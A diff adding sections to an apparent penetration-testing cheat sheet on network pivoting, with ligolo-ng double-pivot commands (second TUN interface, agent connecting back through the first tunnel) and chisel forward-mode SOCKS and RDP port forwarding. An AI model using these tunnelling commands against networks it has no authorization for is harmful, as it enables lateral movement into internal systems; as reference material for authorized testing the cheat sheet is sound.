@@ -32,6 +32,35 @@ sudo ip route add 172.16.1.0/24 dev ligolo
 listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
 ```
 Double pivoting: create a second, distinctly-named TUN interface per additional agent/hop.
+
+**Double-pivot walkthrough (two-hop: attacker → pivot1 → pivot2 → target subnet):**
+```bash
+# === Setup: attacker has ligolo proxy running, pivot1 agent connected, route to subnet1 added ===
+
+# 1. Create a SECOND TUN interface for the second hop
+sudo ip tuntap add user $(whoami) mode tun ligolo2
+sudo ip link set ligolo2 up
+
+# 2. Upload the agent binary to pivot2 THROUGH the first tunnel
+# (pivot2 is on subnet1, reachable via the first ligolo tunnel)
+# Use any file transfer method — curl, scp, nxc --put-file, etc.
+
+# 3. On pivot2: run the agent, connecting BACK through the first tunnel
+# The proxy's listener must be reachable from pivot2's perspective
+./agent -connect <PIVOT1_TUNNEL_IP>:11601 -ignore-cert -retry
+# (use listener_add in the proxy console on the first session to create a listener
+#  that pivot2 can reach through the first tunnel)
+
+# 4. In the proxy console: select the new session from pivot2
+session          # pick the pivot2 session
+ifconfig         # note the target subnet (e.g., 172.16.1.0/24)
+
+# 5. Add a route for the target subnet via the second TUN
+sudo ip route add 172.16.1.0/24 dev ligolo2
+start            # start tunneling on the second session, bound to ligolo2
+```
+Key detail: use `listener_add` in the proxy console to create a listener on the first session's tunnel interface so pivot2 can connect the agent back. Each hop needs its own TUN device and route.
+
 **Reference:** https://github.com/nicocha30/ligolo-ng · https://docs.ligolo.ng/
 
 ## Chisel — HTTP(S)-tunneled reverse SOCKS/TCP (best for restrictive/HTTP-only egress)
@@ -50,6 +79,22 @@ chisel client <ATTACKER_IP>:8080 R:socks
 proxychains nmap -sT -Pn 10.0.2.0/24
 ```
 Remote spec grammar: `3000` (simple local port), `R:2222:localhost:22` (reverse port forward), `R:socks` (reverse SOCKS5), `stdio:host:22`, `1.1.1.1:53/udp`. Auth: `--auth user:pass`.
+
+**Chisel forward mode** (attacker can reach pivot, but pivot has no outbound egress):
+```bash
+# Scenario: attacker can reach pivot-host directly, pivot cannot initiate outbound
+
+# On pivot host: start chisel server
+chisel server -p 8080
+
+# On attacker: connect as client, open local SOCKS proxy through the pivot
+chisel client <PIVOT_IP>:8080 socks
+# Now configure proxychains to use 127.0.0.1:1080 (default chisel SOCKS port)
+
+# Forward a specific port (e.g., RDP on an internal host behind the pivot)
+chisel client <PIVOT_IP>:8080 3389:10.0.2.5:3389
+# Then: rdesktop 127.0.0.1:3389
+```
 
 Double pivot without ligolo: chisel itself has no built-in multi-hop chaining, so don't try to daisy-chain a second `chisel server`/`chisel client` pair through pivot #1's own SOCKS port — that just dials chisel's local server port and never reaches pivot #2's SOCKS listener. Instead, wrap the *existing* pivot #1 SOCKS proxy (from `chisel client <ATTACKER_IP>:8080 R:socks` above) around a second hop, exactly as shown in "Chaining without ligolo (double pivot)" in the proxychains section below: run `proxychains4 ssh -D 1081 ... user@pivot2-internal-ip` through pivot #1's proxy to open pivot #2's own SOCKS port, then use a second proxychains config pointed at 127.0.0.1:1081 to traverse both hops. `ssh -J user@pivot1,user@pivot2 -D 1081 ...` (ProxyJump) is the simplest equivalent when SSH is available on both pivots.
 **Reference:** https://github.com/jpillora/chisel
